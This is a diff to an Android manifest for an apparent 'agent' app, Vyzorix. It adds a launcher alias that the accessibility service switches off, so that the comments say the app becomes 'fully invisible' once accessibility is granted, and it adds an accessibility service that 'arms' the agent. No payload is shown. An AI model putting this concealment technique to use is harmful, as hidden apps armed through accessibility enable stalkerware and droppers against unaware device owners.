@@ -177,17 +177,51 @@
         android:supportsRtl="true"
         android:theme="@android:style/Theme.Material.Light">
 
-        <!-- The entry point that starts the service on a fresh install. See
-             LaunchActivity for why a headless agent still needs one. -->
+        <!-- The setup hop: requests permissions, then opens the Accessibility
+             settings screen. It is NOT the launcher entry — see the alias below. -->
         <activity
             android:name="com.vyzorix.agent.LaunchActivity"
+            android:excludeFromRecents="true"
+            android:exported="false"
+            android:label="Vyzorix"
+            android:noHistory="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- The launcher entry, as an alias so it can be switched off.
+
+             It is visible only until accessibility is granted: the accessibility
+             service disables this component (see VyzorixAccessibilityService), which
+             removes the icon from the app drawer AND greys the app-info "Open"
+             button, because Android offers "Open" only when an enabled launcher
+             activity exists. Enabling accessibility therefore makes the app fully
+             invisible, and disabling it brings the icon back. -->
+        <activity-alias
+            android:name="com.vyzorix.agent.LauncherAlias"
+            android:enabled="true"
             android:exported="true"
-            android:label="Vyzorix">
+            android:label="Vyzorix"
+            android:targetActivity="com.vyzorix.agent.LaunchActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <!-- The enable-gate. The operator turns this on in Settings > Accessibility;
+             that act arms the agent and hides the launcher icon above. The service
+             observes nothing (see VyzorixAccessibilityService). -->
+        <service
+            android:name="com.vyzorix.agent.VyzorixAccessibilityService"
+            android:exported="true"
+            android:label="Vyzorix"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/vyzorix_accessibility_service" />
+        </service>
 
         <!-- Exposes the downloaded APK to the package installer, which runs in
              another process and cannot read the app's private storage. The authority
